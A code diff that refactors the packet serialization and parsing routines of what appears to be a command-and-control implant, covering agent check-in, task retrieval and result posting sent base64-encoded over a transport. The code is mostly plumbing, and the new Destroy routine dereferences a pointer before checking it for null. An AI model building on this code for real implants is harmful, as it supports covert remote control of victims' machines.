@@ -38,7 +38,7 @@ auto DECLFN Package::Base64Enc(
     SIZE_T elen = Base64EncSize(len);
     if (elen == 0) return NULL;
     
-    char* out = (char*)Kh->Hp->Alloc(elen + 1);
+    char* out = (char*)Self->Hp->Alloc(elen + 1);
     if (!out) return NULL;
     
     out[elen] = '\0'; 
@@ -160,7 +160,6 @@ auto DECLFN Package::Base64Dec(
 }
 
 unsigned int DECLFN base64_decode(const char* input, unsigned char* output, unsigned int output_size) {
-    // Tabela de decodificação Base64
     static const unsigned char decode_table[] = {
         0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
         0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
@@ -172,24 +171,19 @@ unsigned int DECLFN base64_decode(const char* input, unsigned char* output, unsi
         41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51,  0,  0,  0,  0,  0
     };
 
-    // Calcula o tamanho da entrada
     unsigned int input_len = 0;
     while (input[input_len] != '\0') input_len++;
 
-    // Verifica se é uma string Base64 válida (múltiplo de 4)
     if (input_len % 4 != 0) return 0;
 
-    // Calcula o tamanho de saída aproximado
     unsigned int output_len = input_len / 4 * 3;
     if (input[input_len - 1] == '=') output_len--;
     if (input[input_len - 2] == '=') output_len--;
 
-    // Verifica se o buffer de saída tem tamanho suficiente
     if (output_len > output_size) return 0;
 
     unsigned int i = 0, j = 0;
     while (i < input_len) {
-        // Pega 4 caracteres
         unsigned char a = input[i] == '=' ? 0 : decode_table[(unsigned char)input[i]];
         unsigned char b = input[i+1] == '=' ? 0 : decode_table[(unsigned char)input[i+1]];
         unsigned char c = input[i+2] == '=' ? 0 : decode_table[(unsigned char)input[i+2]];
@@ -262,11 +256,11 @@ auto DECLFN Int8ToBuffer(
     Buffer[0] = Value & 0xFF;
 }
 
-auto DECLFN Package::AddInt16( 
+auto DECLFN Package::Int16( 
     _In_ PPACKAGE Package, 
     _In_ INT16    dataInt 
 ) -> VOID {
-    Package->Buffer = C_PTR( Kh->Hp->ReAlloc( Package->Buffer, Package->Length + sizeof( INT16 ) ) );
+    Package->Buffer = C_PTR( Self->Hp->ReAlloc( Package->Buffer, Package->Length + sizeof( INT16 ) ) );
 
     Int16ToBuffer( UC_PTR( Package->Buffer ) + Package->Length, dataInt );
 
@@ -274,11 +268,11 @@ auto DECLFN Package::AddInt16(
     Package->Length +=  sizeof( UINT16 );
 }
 
-auto DECLFN Package::AddInt32( 
+auto DECLFN Package::Int32( 
     _In_ PPACKAGE Package, 
     _In_ INT32    dataInt 
 ) -> VOID {
-    Package->Buffer = C_PTR( Kh->Hp->ReAlloc( Package->Buffer, Package->Length + sizeof( INT32 ) ) );
+    Package->Buffer = C_PTR( Self->Hp->ReAlloc( Package->Buffer, Package->Length + sizeof( INT32 ) ) );
 
     Int32ToBuffer( UC_PTR( Package->Buffer ) + Package->Length, dataInt );
 
@@ -286,11 +280,11 @@ auto DECLFN Package::AddInt32(
     Package->Length +=  sizeof( INT32 );
 }
 
-auto DECLFN Package::AddInt64( 
+auto DECLFN Package::Int64( 
     _In_ PPACKAGE Package, 
     _In_ INT64    dataInt 
 ) -> VOID {
-    Package->Buffer = C_PTR( Kh->Hp->ReAlloc(
+    Package->Buffer = C_PTR( Self->Hp->ReAlloc(
         Package->Buffer,
         Package->Length + sizeof( INT64 )
     ));
@@ -302,25 +296,17 @@ auto DECLFN Package::AddInt64(
 }
 
 auto DECLFN Package::Create( 
-    _In_ ULONG   CommandID,
-    _In_ PPARSER Parser
+    _In_ ULONG CommandID,
+    _In_ PCHAR UUID
 ) -> PPACKAGE {
-    PPACKAGE Package  = NULL;
-    PCHAR    TaskUUID = NULL;
-    ULONG    UUIDLen  = 0;
+    PPACKAGE Package = NULL;
 
-    Package            = (PPACKAGE)Kh->Hp->Alloc( sizeof( PACKAGE ) );
-    Package->Buffer    = C_PTR( Kh->Hp->Alloc( sizeof( BYTE ) ) );
-    Package->Length    = 0;
-    Package->CommandID = CommandID;
-    Package->Encrypt   = FALSE;
+    Package         = (PPACKAGE)Self->Hp->Alloc( sizeof( PACKAGE ) );
+    Package->Buffer = Self->Hp->Alloc( sizeof( BYTE ) );
+    Package->Length = 0;
 
-    TaskUUID = Kh->Psr->GetStr( Parser, &UUIDLen );
-
-    Kh->Pkg->AddPad( Package, UC_PTR( Kh->Session.AgentID ), 36 );
-    Kh->Pkg->AddByte( Package, KhPostReq );
-    Kh->Pkg->AddBytes( Package, UC_PTR( TaskUUID ), UUIDLen );
-    Kh->Pkg->AddInt16( Package, CommandID );
+    Self->Pkg->Bytes( Package, UC_PTR( UUID ), 36 );
+    Self->Pkg->Int16( Package, CommandID );
 
     return Package;
 }
@@ -328,13 +314,27 @@ auto DECLFN Package::Create(
 auto DECLFN Package::Checkin( VOID ) -> PPACKAGE {
     PPACKAGE Package = NULL;
 
-    Package          = (PPACKAGE)Kh->Hp->Alloc( sizeof( PACKAGE ) );
-    Package->Buffer  = C_PTR( Kh->Hp->Alloc( sizeof( BYTE ) ) );
+    Package          = (PPACKAGE)Self->Hp->Alloc( sizeof( PACKAGE ) );
+    Package->Buffer  = Self->Hp->Alloc( sizeof( BYTE ) );
     Package->Length  = 0;
     Package->Encrypt = FALSE;
 
-    Kh->Pkg->AddPad( Package, UC_PTR( Kh->Session.AgentID ), 36 );
-    Kh->Pkg->AddByte( Package, KhCheckin );
+    Self->Pkg->Pad( Package, UC_PTR( Self->Session.AgentID ), 36 );
+    Self->Pkg->Byte( Package, KhCheckin );
+
+    return Package;
+}
+
+auto DECLFN Package::PostJobs( VOID ) -> PPACKAGE {
+    PPACKAGE Package = NULL;
+
+    Package          = (PPACKAGE)Self->Hp->Alloc( sizeof( PACKAGE ) );
+    Package->Buffer  = C_PTR( Self->Hp->Alloc( sizeof( BYTE ) ) );
+    Package->Length  = 0;
+    Package->Encrypt = FALSE;
+
+    Self->Pkg->Pad( Package, UC_PTR( Self->Session.AgentID ), 36 );
+    Self->Pkg->Byte( Package, KhPostReq );
 
     return Package;
 }
@@ -344,13 +344,13 @@ auto DECLFN Package::NewTask(
 ) -> PPACKAGE {
     PPACKAGE Package = NULL;
 
-    Package          = (PPACKAGE)Kh->Hp->Alloc( sizeof( PACKAGE ) );
-    Package->Buffer  = C_PTR( Kh->Hp->Alloc( sizeof( BYTE ) ) );
+    Package          = (PPACKAGE)Self->Hp->Alloc( sizeof( PACKAGE ) );
+    Package->Buffer  = C_PTR( Self->Hp->Alloc( sizeof( BYTE ) ) );
     Package->Length  = 0;
     Package->Encrypt = FALSE;
 
-    Kh->Pkg->AddPad( Package, UC_PTR( Kh->Session.AgentID ), 36 );
-    Kh->Pkg->AddByte( Package, KhGetTask );
+    Self->Pkg->Pad( Package, UC_PTR( Self->Session.AgentID ), 36 );
+    Self->Pkg->Byte( Package, KhGetTask );
 
     return Package;
 }
@@ -358,15 +358,17 @@ auto DECLFN Package::NewTask(
 auto DECLFN Package::Destroy( 
     _In_ PPACKAGE Package 
 ) -> VOID {
-    if ( !Package ) {
-        return;
-    }
-    if ( !Package->Buffer ) {
-        return;
+
+    if ( Package->Buffer ) {
+        Self->Hp->Free( Package->Buffer, Package->Length );
+        Package->Buffer = nullptr;
+        Package->Length = 0;
     }
 
-    Kh->Hp->Free( Package->Buffer, Package->Length );
-    Kh->Hp->Free( Package, sizeof( PACKAGE ) );
+    if ( Package ) {
+        Self->Hp->Free( Package, sizeof( PACKAGE ) );
+        Package = nullptr;
+    }
     
     return;
 }
@@ -382,57 +384,36 @@ auto DECLFN Package::Transmit(
     PVOID  RetBuffer  = NULL;
     UINT64 Retsize    = 0;
 
-    PCHAR  FinalPacket    = Kh->Pkg->Base64Enc( (const unsigned char*)Package->Buffer, Package->Length );
-    UINT64 FinalPacketLen = Kh->Pkg->Base64EncSize( Package->Length );
+    PCHAR  FinalPacket    = Self->Pkg->Base64Enc( (const unsigned char*)Package->Buffer, Package->Length );
+    UINT64 FinalPacketLen = Self->Pkg->Base64EncSize( Package->Length );
 
-    Kh->Pkg->Destroy( Package );
+    Self->Pkg->Destroy( Package );
 
-    if ( Kh->Tsp->Send( FinalPacket, FinalPacketLen, &Base64Buff, &Base64Size ) ) {
+    if ( Self->Tsp->Send( FinalPacket, FinalPacketLen, &Base64Buff, &Base64Size ) ) {
         Success = TRUE;
     }
 
+
     if ( Base64Buff && Base64Size ) {
-        Retsize   = Kh->Pkg->Base64DecSize( (PCHAR)Base64Buff );
-        RetBuffer = Kh->Hp->Alloc( Retsize );
+        Retsize   = Self->Pkg->Base64DecSize( (PCHAR)Base64Buff );
+        RetBuffer = Self->Hp->Alloc( Retsize );
         base64_decode( (PCHAR)Base64Buff, (PUCHAR)RetBuffer, Retsize );
-        
         if ( Response && Size ) {
             *Response = RetBuffer;
             *Size     = Retsize;
         }
     }
     
-    Success = Kh->Hp->Free( FinalPacket, FinalPacketLen );
+    Success = Self->Hp->Free( FinalPacket, FinalPacketLen );
     
     return Success;
 }
 
-auto DECLFN Package::Error(
-    _In_ ULONG ErrorCode
-) -> VOID {
-
-    // if ( VELKOR_PACKAGE ) Package::Destroy( VELKOR_PACKAGE );
-
-    // BOOL bNtStatus = FALSE;
-
-    // if ( Velkor->Session.SyscallMethod != VkCallWinApi ) bNtStatus = TRUE;
-
-    // if ( bNtStatus ) ErrorCode = VkCall<UINT32>( XprNtdll, XPR( "RtlNtStatusToDosError" ), ErrorCode );
-
-    // U37_PACKAGE = Package::Create( Stage37Error );
-    
-    // PSTR ErrorMessage = ErrorHandler( ErrorCode, InputString );
-
-    // AddInt32(  U37_PACKAGE, ErrorCode );
-    // AddString( U37_PACKAGE, ErrorMessage );
-    // Transmit(  U37_PACKAGE, NULL, NULL );
-}
-
-auto DECLFN Package::AddByte( 
+auto DECLFN Package::Byte( 
     _In_ PPACKAGE Package, 
     _In_ BYTE     dataInt 
 ) -> VOID {
-    Package->Buffer = Kh->Hp->ReAlloc( Package->Buffer, Package->Length + sizeof( BYTE ) );
+    Package->Buffer = Self->Hp->ReAlloc( Package->Buffer, Package->Length + sizeof( BYTE ) );
     if ( !Package->Buffer ) { return; }
 
     ( B_PTR( Package->Buffer ) + Package->Length )[0] = dataInt;
@@ -441,12 +422,12 @@ auto DECLFN Package::AddByte(
     return;
 }
 
-auto DECLFN Package::AddPad( 
+auto DECLFN Package::Pad( 
     _In_ PPACKAGE Package, 
     _In_ PUCHAR   Data, 
     _In_ SIZE_T   Size 
 ) -> VOID {
-    Package->Buffer = A_PTR( Kh->Hp->ReAlloc(
+    Package->Buffer = A_PTR( Self->Hp->ReAlloc(
         Package->Buffer,
         Package->Length + Size
     ));
@@ -457,14 +438,14 @@ auto DECLFN Package::AddPad(
     Package->Length += Size;
 }
 
-auto DECLFN Package::AddBytes( 
+auto DECLFN Package::Bytes( 
     _In_ PPACKAGE Package, 
     _In_ PUCHAR   Data, 
     _In_ SIZE_T   Size 
 ) -> VOID {
-    Kh->Pkg->AddInt32( Package, Size );
+    Self->Pkg->Int32( Package, Size );
 
-    Package->Buffer = C_PTR( Kh->Hp->ReAlloc( Package->Buffer, Package->Length + Size ) );
+    Package->Buffer = C_PTR( Self->Hp->ReAlloc( Package->Buffer, Package->Length + Size ) );
 
     Int32ToBuffer( UC_PTR( U_PTR( Package->Buffer ) + ( Package->Length - sizeof( UINT32 ) ) ), Size );
 
@@ -474,18 +455,18 @@ auto DECLFN Package::AddBytes(
     Package->Length +=  Size;
 }
 
-auto DECLFN Package::AddString( 
+auto DECLFN Package::Str( 
     _In_ PPACKAGE package, 
     _In_ PCHAR    data 
 ) -> VOID {
-    return Kh->Pkg->AddBytes( package, (PBYTE) data, Str::LengthA( data ) );
+    return Self->Pkg->Bytes( package, (PBYTE) data, Str::LengthA( data ) );
 }
 
-auto DECLFN Package::AddWString( 
+auto DECLFN Package::Wstr( 
     _In_ PPACKAGE package, 
     _In_ PWCHAR   data 
 ) -> VOID {
-    return Kh->Pkg->AddBytes( package, (PBYTE) data, Str::LengthW( data ) * 2 );
+    return Self->Pkg->Bytes( package, (PBYTE) data, Str::LengthW( data ) * 2 );
 }
 
 auto DECLFN Parser::New( 
@@ -496,7 +477,7 @@ auto DECLFN Parser::New(
     if ( parser == NULL )
         return;
 
-    parser->Original = A_PTR( Kh->Hp->Alloc( size ) );
+    parser->Original = A_PTR( Self->Hp->Alloc( size ) );
     Mem::Copy( C_PTR( parser->Original ), C_PTR( Buffer ), size );
     parser->Buffer   = parser->Original;
     parser->Length   = size;
@@ -511,13 +492,13 @@ auto DECLFN Parser::NewTask(
     if ( parser == NULL )
         return;
 
-    parser->Original = A_PTR( Kh->Hp->Alloc( size ) );
+    parser->Original = A_PTR( Self->Hp->Alloc( size ) );
     Mem::Copy( C_PTR( parser->Original ), C_PTR( Buffer ), size );
     parser->Buffer   = parser->Original;
     parser->Length   = size;
     parser->Size     = size;
 
-    Kh->Psr->Pad( parser, 36 );
+    Self->Psr->Pad( parser, 36 );
 }
 
 
@@ -539,7 +520,7 @@ auto DECLFN Parser::Pad(
     return padData;
 }
 
-auto DECLFN Parser::GetInt32( 
+auto DECLFN Parser::Int32( 
     _In_ PPARSER parser 
 ) -> INT32 {
     INT32 intBytes = 0;
@@ -558,7 +539,7 @@ auto DECLFN Parser::GetInt32(
         return ( INT ) __builtin_bswap32( intBytes );
 }
 
-auto DECLFN Parser::GetBytes( 
+auto DECLFN Parser::Bytes( 
     _In_ PPARSER parser, 
     _In_ PULONG  size 
 ) -> PBYTE {
@@ -591,27 +572,33 @@ auto DECLFN Parser::GetBytes(
 auto DECLFN Parser::Destroy( 
     _In_ PPARSER Parser 
 ) -> BOOL {
+    BOOL Success = TRUE;
+
     if ( Parser->Original ) {
-        return Kh->Hp->Free( Parser->Original, Parser->Length );
+        Success = Self->Hp->Free( Parser->Original, Parser->Length );
     }
 
-    return FALSE;
+    if ( Parser ) {
+        Success = Self->Hp->Free( Parser, sizeof( PARSER ) );
+    }
+
+    return Success;
 }
 
-auto DECLFN Parser::GetStr( 
+auto DECLFN Parser::Str( 
     _In_ PPARSER parser, 
     _In_ PULONG size 
 ) -> PCHAR {
-    return ( PCHAR ) Kh->Psr->GetBytes( parser, size );
+    return ( PCHAR ) Self->Psr->Bytes( parser, size );
 }
 
-auto DECLFN Parser::GetWstr( 
+auto DECLFN Parser::Wstr( 
     _In_ PPARSER parser, 
     _In_ PULONG  size 
 ) -> PWCHAR {
-     return ( PWCHAR )Kh->Psr->GetBytes( parser, size );
+     return ( PWCHAR )Self->Psr->Bytes( parser, size );
 }
-auto DECLFN Parser::GetInt16( 
+auto DECLFN Parser::Int16( 
     _In_ PPARSER parser
 ) -> INT16 {
     INT16 intBytes = 0;
@@ -627,7 +614,7 @@ auto DECLFN Parser::GetInt16(
     return intBytes;
 }
 
-auto DECLFN Parser::GetInt64( 
+auto DECLFN Parser::Int64( 
     _In_ PPARSER parser 
 ) -> INT64 {
     INT64 intBytes = 0;
@@ -649,7 +636,7 @@ auto DECLFN Parser::GetInt64(
         return ( INT64 ) __builtin_bswap64( intBytes );
 }
 
-auto DECLFN Parser::GetByte( 
+auto DECLFN Parser::Byte( 
     _In_ PPARSER parser 
 ) -> BYTE {
     BYTE intBytes = 0;
